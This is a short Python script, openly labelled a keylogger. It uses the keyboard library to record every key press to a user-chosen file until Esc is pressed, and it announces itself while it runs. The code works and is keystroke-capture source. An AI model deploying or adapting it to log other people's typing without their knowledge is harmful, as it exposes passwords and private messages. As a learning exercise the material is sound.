#keylogger
import keyboard
def pressed(key):
  try:
     with open(path,'a') as file: #opening the file in append mode
       file.write(f"{key.name} "if hasattr(key, 'name') else str(key)+' ') #register the key name or convert it to string if it doesn't have an attribute
  except Exception as e:
     print(f"An error occurred while writing to the file: {e}")#printing the error type

  #getting the file path from the user C:\Users\Abdeladim\Desktop
path=input("enter the path to the logging file:  ")

  # Register the callback function
keyboard.on_press(pressed)

  # Inform the user and keep the script running
print("Key logger is running. Press 'Esc' to stop.")
keyboard.wait('esc')
print("Key logger stopped.")